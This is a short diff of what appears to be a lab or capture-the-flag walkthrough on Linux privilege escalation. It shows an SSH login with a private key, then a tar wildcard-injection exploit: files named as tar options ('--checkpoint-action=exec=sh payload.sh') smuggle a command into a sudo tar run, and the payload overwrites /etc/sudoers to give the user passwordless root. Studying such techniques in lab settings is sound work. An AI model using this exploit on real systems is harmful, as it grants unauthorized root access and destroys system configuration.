@@ -394,10 +394,11 @@ ssh james@192.168.231.10 -i james_ecdsa
 
 # exploit
 sudo -l
+# payload.sh
 echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
 echo "" > '--checkpoint=1'  
 echo "" > '--checkpoint-action=exec=sh payload.sh'
-
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
 
 ```
 
